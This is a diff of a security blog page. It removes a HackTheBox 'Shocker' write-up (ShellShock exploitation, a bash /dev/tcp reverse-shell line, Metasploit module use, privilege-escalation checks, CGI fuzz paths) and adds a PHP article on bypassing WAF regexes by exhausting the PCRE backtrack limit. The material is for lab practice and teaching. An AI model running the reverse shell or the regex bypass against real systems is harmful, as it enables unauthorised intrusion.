@@ -228,7 +228,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/07/05/yuque/HackTheBox%E7%AC%94%E8%AE%B0%EF%BC%9AShocker/">
+    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/08/14/P-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Unc1e">
@@ -247,7 +247,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/07/05/yuque/HackTheBox%E7%AC%94%E8%AE%B0%EF%BC%9AShocker/" itemprop="url">HackTheBox笔记：Shocker</a></h1>
+                <a class="post-title-link" href="/2020/08/14/P-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" itemprop="url">P-代码审计点之利用回溯绕过正则表达式</a></h1>
         
 
         <div class="post-meta">
@@ -259,8 +259,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-05T00:45:31+08:00">
-                2020-07-05
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-14T10:29:53+08:00">
+                2020-08-14
               </time>
             
 
@@ -299,97 +299,71 @@
       
         
           
-            <h1 id="Entry-point"><a href="#Entry-point" class="headerlink" title="Entry point"></a>Entry point</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> nmap <span class="literal">-p</span>- <span class="literal">-sC</span> <span class="literal">-sV</span>  <span class="literal">-Pn</span> <span class="number">10.10</span>.<span class="number">10.56</span> <span class="literal">-oA</span> allport</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span>.<span class="number">10.56</span></span><br><span class="line">Host is up (<span class="number">0.0037</span>s latency).</span><br><span class="line">Not shown: <span class="number">65533</span> closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span>/tcp   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">18</span> ((Ubuntu))</span><br><span class="line">|_http<span class="literal">-server</span><span class="literal">-header</span>: Apache/<span class="number">2.4</span>.<span class="number">18</span> (Ubuntu)</span><br><span class="line">|_http<span class="literal">-title</span>: Site doesn<span class="string">'t have a title (text/html).</span></span><br><span class="line"><span class="string">2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span></span><br><span class="line"><span class="string">| ssh-hostkey:</span></span><br><span class="line"><span class="string">|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)</span></span><br><span class="line"><span class="string">|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)</span></span><br><span class="line"><span class="string">|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br></pre></td></tr></table></figure>
+            <h1 id="PHP代码审计之利用回溯绕过正则表达式"><a href="#PHP代码审计之利用回溯绕过正则表达式" class="headerlink" title="PHP代码审计之利用回溯绕过正则表达式"></a>PHP代码审计之利用回溯绕过正则表达式</h1><p>第一篇：利用回溯绕过PHP中的正则表达式</p>
+<h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>首先，来看一段在waf上很常见的正则，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/SELECT.+FROM.+/is'</span>, $_POST[<span class="string">'sql'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"SQL injection"</span>) <span class="comment">//WAF</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	<span class="keyword">echo</span>($_POST[<span class="string">'sql'</span>]);</span><br><span class="line">		<span class="comment">//mysql_query($db,  $_POST['sql']); //查询</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>hydra to brute SSH using fastrack.txt, nothing to gain.</p>
-<h2 id="cgi-bin"><a href="#cgi-bin" class="headerlink" title="/cgi-bin/"></a>/cgi-bin/</h2><p>using <code>binwalk</code> and <code>file</code>, got nothing special<br><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/166008/1594136861077-edc920b1-b5c0-477b-b5a9-71441f8930ed.jpeg#align=left&display=inline&height=210&margin=%5Bobject%20Object%5D&name=bug.jpg&originHeight=420&originWidth=820&size=36861&status=done&style=none&width=410" alt="bug.jpg"><br>dir searching</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://10.10.10.56/ -e \*</span><br><span class="line"></span><br><span class="line"><span class="emphasis">_|. _</span> \<span class="emphasis">_ \_</span> \<span class="emphasis">_ \_</span> <span class="emphasis">_|_</span> v0.3.9</span><br><span class="line">(<span class="emphasis">_||| _</span>) (/<span class="emphasis">_(_</span>|| (\_| )</span><br><span class="line"></span><br><span class="line">Extensions: | HTTP method: getSuffixes: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6564 | Request count: 6564</span><br><span class="line"></span><br><span class="line">Error Log: /opt/dirsearch/logs/errors-20-07-07_23-26-11.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.56/</span><br><span class="line"></span><br><span class="line">Output File: /opt/dirsearch/reports/10.10.10.56/20-07-07_23-26-16</span><br><span class="line"></span><br><span class="line">[23:26:16] Starting:</span><br><span class="line">[23:28:27] 403 - 299B - /.htaccess-dev</span><br><span class="line">[23:28:27] 403 - 301B - /.htaccess-local</span><br><span class="line">[23:28:27] 403 - 301B - /.htaccess-marco</span><br><span class="line">[23:28:28] 403 - 298B - /.htaccessBAK</span><br><span class="line">[23:28:28] 403 - 299B - /.htaccess.txt</span><br><span class="line">[23:28:28] 403 - 302B - /.htaccess.sample</span><br><span class="line">[23:28:28] 403 - 299B - /.htaccess.old</span><br><span class="line">[23:28:28] 403 - 300B - /.htaccess.orig</span><br><span class="line">[23:28:28] 403 - 300B - /.htaccess.save</span><br><span class="line">[23:28:28] 403 - 300B - /.htaccess.bak1</span><br><span class="line">[23:28:28] 403 - 298B - /.htaccessOLD</span><br><span class="line">[23:28:28] 403 - 299B - /.htaccessOLD2</span><br><span class="line">[23:28:28] 403 - 299B - /.htpasswd-old</span><br><span class="line">[23:28:28] 403 - 297B - /.httr-oauth</span><br><span class="line">[23:34:58] 403 - 294B - /cgi-bin/</span><br></pre></td></tr></table></figure>
+<p>如何绕过?——相信师傅们肯定是方法多多。但今天主要详细说说其中的一种另类的绕过方式，利用正则回溯绕过正则判断</p>
+<p><img src="%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/select_bypass.gif" alt="select_bypass"></p>
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>要知道``preg_match`的返回值：除了0和1，还可能因为出错而返回<strong>false</strong></p>
+<p><img src="%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20200731114158728.png" alt="image-20200731114158728"></p>
+<p>出错的原因大致有两个，1. 正则回溯次数超过限制 ； 2. 入参的类型不是字符串（数组类型）</p>
+<p>我们主要关注第一种：利用正则回溯次数超过限制。回到一开始举的例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/SELECT.+FROM.+/is'</span>, $_POST[<span class="string">'sql'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"SQL injection"</span>) <span class="comment">//WAF</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	<span class="keyword">echo</span>($_POST[<span class="string">'sql'</span>]);</span><br><span class="line">		<span class="comment">//mysql_query($db,  $_POST['sql']); //查询</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>after obtaining these, no progress.</p>
-<h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><p>while searching for “<strong>shocker cgi-bin</strong>“, finding a open-source project named <em>shocker, see</em><a href="https://github.com/nccgroup/shocker" target="_blank" rel="noopener"> https://github.com/nccgroup/shocker</a><br>add the ext of “<strong>.sh, .cgi</strong>“ in dirbuster,</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594136843939-1432239f-560b-43ec-8d61-aa0de544520c.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=Deepin%20%E6%88%AA%E5%9C%96_select-area_20200707234227.png&originHeight=230&originWidth=1916&size=18242&status=done&style=none&width=1916" alt="Deepin 截圖_select-area_20200707234227.png"><br>also, <code>dirb [http://10.10.10.56/cgi-bin](http://10.10.10.56/cgi-bin) -X .cgi,.sh,.php,.py,.pl</code> is supported.</p>
-<h2 id="cgi-bin-user-sh"><a href="#cgi-bin-user-sh" class="headerlink" title="/cgi/bin/user.sh"></a>/cgi/bin/user.sh</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">Just an uptime test script</span><br><span class="line"></span><br><span class="line">11:46:01 up 1:16, 0 users, load average: 0.00, 0.00, 0.00</span><br></pre></td></tr></table></figure>
-
-<p>the exp of <strong>RCE</strong> can be used at least in 2 ways<br>1st is the <em>shock</em> scirpt</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shocker.py -H 10.10.10.56 -c '/cgi-bin/user.sh'</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594137744360-0f8d0978-12e1-4092-b203-28358242f5be.png#align=left&display=inline&height=826&margin=%5Bobject%20Object%5D&name=exp.png&originHeight=826&originWidth=1445&size=147075&status=done&style=none&width=1445" alt="exp.png"></p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># rce on shocker</span></span><br><span class="line"></span><br><span class="line">\$ /bin/bash -i &gt;&amp; /dev/tcp/10.10.16.122/1337 0&gt;&amp;1</span><br><span class="line">No response</span><br><span class="line"></span><br><span class="line"><span class="section"># get reverse shell</span></span><br><span class="line"></span><br><span class="line">\$ nc -lvp 1337</span><br><span class="line">listening on [any] 1337 ...</span><br><span class="line">10.10.10.56: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.16.122] from (UNKNOWN) [10.10.10.56] 55964</span><br><span class="line">bash: no job control in this shell</span><br><span class="line"></span><br><span class="line">shelly@Shocker:/usr/lib/cgi-bin\$ ls</span><br><span class="line">user.sh</span><br><span class="line"></span><br><span class="line">shelly@Shocker:/usr/lib/cgi-bin\$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span><br></pre></td></tr></table></figure>
-
-<p>the 2nd is <strong>msf</strong></p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/http/apache<span class="emphasis">_mod_</span>cgi<span class="emphasis">_bash_</span>env_exec) &gt; set lhost tun0</span><br><span class="line">lhost =&gt; tun0</span><br><span class="line">msf5 exploit(multi/http/apache<span class="emphasis">_mod_</span>cgi<span class="emphasis">_bash_</span>env_exec) &gt; set rhosts 10.10.10.56</span><br><span class="line">rhosts =&gt; 10.10.10.56</span><br><span class="line">msf5 exploit(multi/http/apache<span class="emphasis">_mod_</span>cgi<span class="emphasis">_bash_</span>env_exec) &gt; set targeturi /cgi-bin/user.sh</span><br><span class="line">targeturi =&gt; /cgi-bin/user.sh</span><br><span class="line">msf5 exploit(multi/http/apache<span class="emphasis">_mod_</span>cgi<span class="emphasis">_bash_</span>env_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.122:4444</span><br><span class="line">[*] Command Stager progress - 100.46% done (1097/1092 bytes)</span><br><span class="line">[*] Sending stage (980808 bytes) to 10.10.10.56</span><br></pre></td></tr></table></figure>
-
-<h1 id="priv-esc"><a href="#priv-esc" class="headerlink" title="priv esc"></a>priv esc</h1><h2 id="sudo-perl"><a href="#sudo-perl" class="headerlink" title="sudo perl"></a>sudo perl</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">shelly@Shocker:/usr/lib/cgi-bin\$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for shelly on Shocker:</span><br><span class="line">env<span class="emphasis">_reset, mail_</span>badpass,</span><br><span class="line">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User shelly may run the following commands on Shocker:</span><br><span class="line">(root) NOPASSWD: /usr/bin/perl</span><br></pre></td></tr></table></figure>
-
-<h2 id="priv-esc-via-lxd"><a href="#priv-esc-via-lxd" class="headerlink" title="priv esc via lxd"></a>priv esc via lxd</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\$ cat /etc/passwd</span><br><span class="line">...</span><br><span class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">\$ id</span><br><span class="line">uid=1000(shelly) ... 110(lxd) ...</span><br></pre></td></tr></table></figure>
-
-<h1 id="Note-on-ShellShock"><a href="#Note-on-ShellShock" class="headerlink" title="Note on ShellShock"></a>Note on ShellShock</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/166008/1594266649245-d88435b8-f042-4550-86fa-f91203014705.jpeg#align=left&display=inline&height=511&margin=%5Bobject%20Object%5D&originHeight=511&originWidth=395&size=0&status=done&style=none&width=395" alt=""></p>
-<blockquote>
-<p>GNU Bash 4.3 及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行 Shell 命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用 Bash Shell 之前可以用构造的值创建环境变量。这些变量可以包含代码，在 Shell 被调用后会被立即执行。<br>以下几点值得特别注意：</p>
+<p>只看前几行判断入参是否为php代码的is_php()函数：</p>
+<p>当输入的字符串中含有<code>SELECT</code>、<code>FROM</code>，且两个词后分别跟有任意字符串，即视为满足匹配，<code>preg_match</code>就会返回1。其中的参数介绍如下</p>
 <ul>
-<li>这个漏洞的英文是：ShellShock，中文名被 XCERT 命名为：破壳漏洞。</li>
-<li>来自 CVSS 的评分：破壳漏洞的严重性被定义为 10 级（最高），今年 4 月爆发的 OpenSSL“心脏出血”漏洞才 5 级！</li>
-<li>破壳漏洞存在有 25 年，和 Bash 年龄一样。</li>
+<li><code>.+</code>，“点 加号”，<code>.</code>表示匹配除了换行符\n之外的任意单个字符串，+ 匹配前面的子表达式1次或多次，两者合在一起，其实就表示匹配任意的字符串。</li>
 </ul>
-<p>GNU Bash &lt;= 4.3，此漏洞可能会影响到</p>
+<p>这段正则是有问题的——但问题在哪里呢？这就要从PHP中正则的匹配原理说起。</p>
+<p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限  <code>pcre.backtrack_limit</code>，我们可以在phpinfo里查看当前环境下的上限，默认为1000,000</p>
+<p><img src="%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20200731114823341.png" alt="image-20200731114823341"></p>
+<p>常见的正则引擎，可被细分为 DFA（确定性有限状态自动机）与 NFA（非确定性有限状态自动机）。大多数程序语言都使用了 NFA 作为正则引擎，其中也包括 PHP 使用的 PCRE 库。</p>
+<blockquote>
+<p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行往回查找（回溯），尝试其他状态</p>
 </blockquote>
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594266142774-e2a59a54-e481-4409-a882-d215069aceb9.png#align=left&display=inline&height=89&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=89&originWidth=811&size=10652&status=done&style=none&width=811" alt="图片.png"></p>
-<ol>
-<li>对于 HTTP 头部，CGI 脚本解析器会将其当作环境变量，调用 bash 的 env 相关函数设置到临时环境变量中；</li>
-<li>HTTP 协议允许发送任意客户端自定义的 HTTP 头部；</li>
-<li>这样就产生了一个完整的可供 Bash 命令注入的场景，客户端故意发送构造好的带攻击命令的 HTTP 头部到服务端，服务端调用设置环境变量的函数，直接执行了客户端指定的头部里面的命令。并且还会将结果一并返回给客户端。</li>
-</ol>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Shellshock 的原理是利用了 Bash 在导入环境变量函数时候的漏洞，启动 Bash 的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。在有些 CGI 脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用 Shellshock 漏洞的机会。<br>目前的 bash 使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“<code>(){</code>”开头定义的环境变量在命令 ENV 中解析成函数后，Bash 执行并未退出，而是继续解析并执行 shell 命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。<br>Apache 服务器中使用<code>mod_cgi</code>（不包括<code>mod_php</code>或<code>mod_python</code>）运行脚本的时候，数据是通过环境变量来传递的，这可以算是互联网领域最古老的一些技术了。</p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>可以使用如下命令来检查系统是否存在此漏洞（在本机 Bash 环境下运行）：<br><strong>破壳 1，CVE-2014-6271</strong>，测试方法：<br><code>env x=&#39;() { :;}; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;</code><br>如执行结果如下表明有漏洞：<code>vulnerable, this is a test</code></p>
-<hr>
-<p><strong>破壳 2，CVE-2014-7169，</strong>测试方法：<br><code>env -i X=&#39;() { (a)=&gt;\&#39; bash -c &#39;echo date&#39;; cat echo</code><br>如执行结果如下则仍然存在漏洞：<br><code>bash: X: line 1: syntax error near unexpected token =&#39;bash: X: line 1: &#39;bash: error importing function definition for</code>X’Wed Sep 24 14:12:49 PDT 2014`<br>…</p>
-<h2 id="Fuzzing-列表"><a href="#Fuzzing-列表" class="headerlink" title="Fuzzing 列表"></a>Fuzzing 列表</h2><p>经过 ZoomEye 的 Fuzzing 探测，Fuzzing 列表如下：</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/load.cgi</span><br><span class="line">/cgi-bin/gsweb.cgi</span><br><span class="line">/cgi-bin/redirector.cgi</span><br><span class="line">/cgi-bin/test.cgi</span><br><span class="line">/cgi-bin/index.cgi</span><br><span class="line">/cgi-bin/help.cgi</span><br><span class="line">/cgi-bin/about.cgi</span><br><span class="line">/cgi-bin/vidredirect.cgi</span><br><span class="line">/cgi-bin/click.cgi</span><br><span class="line">/cgi-bin/details.cgi</span><br><span class="line">/cgi-bin/log.cgi</span><br><span class="line">/cgi-bin/viewcontent.cgi</span><br><span class="line">/cgi-bin/content.cgi</span><br><span class="line">/cgi-bin/admin.cgi</span><br><span class="line">/cgi-bin/webmail.cgi</span><br></pre></td></tr></table></figure>
+<p>那 NFA 自动机到底是怎么进行回溯的呢？我们以下面的字符和表达式来举例说明。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regex&#x3D;&#x2F;SELECT.+FROM.+&#x2F;</span><br><span class="line">param&#x3D;select id from &#x2F;*0123456789*&#x2F; test</span><br></pre></td></tr></table></figure>
 
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>现在可以按照下面方式进行 Bash 的升级修复：</p>
-<table>
-<thead>
-<tr>
-<th>操作系统</th>
-<th>升级方式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Ubuntu/Debian</td>
-<td>apt-get update</td>
-</tr>
-<tr>
-<td>apt-get install bash</td>
-<td></td>
-</tr>
-<tr>
-<td>RedHat/CentOS/Fedora</td>
-<td>yum update -y bash</td>
-</tr>
-<tr>
-<td>Arch Linux</td>
-<td>pacman -Syu</td>
-</tr>
-<tr>
-<td>OS X</td>
-<td>brew update</td>
-</tr>
-</tbody></table>
-<p>brew install bash<br>sudo sh -c ‘echo “/usr/local/bin/bash” &gt;&gt; /etc/shells’<br>chsh -s /usr/local/bin/bash<br>sudo mv /bin/bash /bin/bash-backup<br>sudo ln -s /usr/local/bin/bash /bin/bash |<br>| MacPorts | sudo port self update<br>sudo port upgrade bash |</p>
-<p>建议升级后按上面的方法诊断是否补丁完全。</p>
-<h2 id="感慨"><a href="#感慨" class="headerlink" title="感慨"></a>感慨</h2><p>威胁经常在人们不期望它们到来的时候到来，也许是无心的雪崩，也许是有意的蓄谋。“病毒不会在星期天休息”这是安天新员工培训时必须传递的一句话，我们从柏松那里听到过这句话，我们也把这句话讲给过安天的新人。我们也许会在一瞬间被威胁打的措手不及，但不会有威胁能长久的逃逸出我们的感知和分析。<br>谨把我们的工作献给我们家人、我们的战友和我们的祖国</p>
-<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><ul>
-<li><a href="https://www.anquanke.com/post/id/179407" target="_blank" rel="noopener">https://www.anquanke.com/post/id/179407</a></li>
-<li><a href="https://fdlucifer.github.io/2020-01-20-Privilege-Escalation-via-lxd" target="_blank" rel="noopener">https://fdlucifer.github.io/2020-01-20-Privilege-Escalation-via-lxd</a></li>
-<li><a href="https://www.jianshu.com/p/66f74282a299" target="_blank" rel="noopener">Shocker</a></li>
-<li><a href="https://github.com/nccgroup/shocker" target="_blank" rel="noopener"> nccgroup / shocker </a></li>
-<li><a href="https://blog.knownsec.com/2014/10/shellshock_response_profile_v4/" target="_blank" rel="noopener">https://blog.knownsec.com/2014/10/shellshock_response_profile_v4/</a></li>
-<li><a href="https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/" target="_blank" rel="noopener">https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/</a></li>
-<li><a href="https://raw.githubusercontent.com/citypw/DNFWAH/master/4/d4_0x07_DNFWAH_shellshock_bash_story_cve-2014-6271.txt" target="_blank" rel="noopener">https://raw.githubusercontent.com/citypw/DNFWAH/master/4/d4_0x07_DNFWAH_shellshock_bash_story_cve-2014-6271.txt</a></li>
-<li><a href="https://www.antiy.com/response/Analysis_Report_on_Sample_Set_of_Bash_Shellshock.html" target="_blank" rel="noopener">https://www.antiy.com/response/Analysis_Report_on_Sample_Set_of_Bash_Shellshock.html</a></li>
-<li><a href="https://blog.csdn.net/weixin_33709219/article/details/87981615" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33709219/article/details/87981615</a></li>
-<li><a href="https://www.antiy.com/response/CVE-2014-6271.html" target="_blank" rel="noopener">https://www.antiy.com/response/CVE-2014-6271.html</a></li>
-<li><a href="https://www.smh.com.au/technology/stephane-chazelas-the-man-who-found-the-webs-most-dangerous-internet-security-bug-20140926-10mixr.html" target="_blank" rel="noopener">https://www.smh.com.au/technology/stephane-chazelas-the-man-who-found-the-webs-most-dangerous-internet-security-bug-20140926-10mixr.html</a></li>
+<ul>
+<li>首先，拿到正则表达式的第一个匹配符S，于是去和字符串的字符进行比较，字符串的第一个字符是s，匹配(忽略大小写)，换下一个，第二个是 E，和字符串的第二个字符e匹配，再换下一个，一直到SELECT与select匹配完毕</li>
+<li>读取到正则表达式匹配符的第二部分<code>.+</code>：任意字符串匹配1次以上，那么可以一次性匹配掉剩下的所有字符串，即正则拿到<code>select id from /*0123456789*/ test</code>，但此时正则表达式中的<code>F</code>是无法匹配上的，且拿到的字符串已到了末尾，于是开始回溯，从末尾开始往回匹配，首先尝试匹配末尾的<code>t</code>，当然无法匹配上<code>F</code>，于是匹配倒数第二个字符<code>s</code>，也不行，于是一步步回溯到字符串中的<code>f</code>，回溯次数一次又一次地增加着。。直到回溯次数超过预设值<code>1000,000</code>而发生错误，函数返回false</li>
+</ul>
+<p>因此，我们可以通过<strong>发送超长字符串</strong>的方式，使正则执行失败，返回<strong>false</strong>，从而绕过目标对 PHP 语言的限制。</p>
+<p><img src="%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/regex3.gif" alt="regex3"></p>
+<p>（动画中是正则调试器，来自：<a href="https://regex101.com/r/pf5Pa0/1/debugger）" target="_blank" rel="noopener">https://regex101.com/r/pf5Pa0/1/debugger）</a></p>
+<p>开头的那种方法，便是这样绕过的，但其实有个前提，payload必须在<strong>POST</strong>的参数里，不能是GET的参数，因为RFC 2616里限制了GET的参数最长不能超过8K(8*1024)，本地实测8178个字符，超过状态码即变成414</p>
+<p><img src="%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20200812164653626.png" alt="image-20200812164653626"></p>
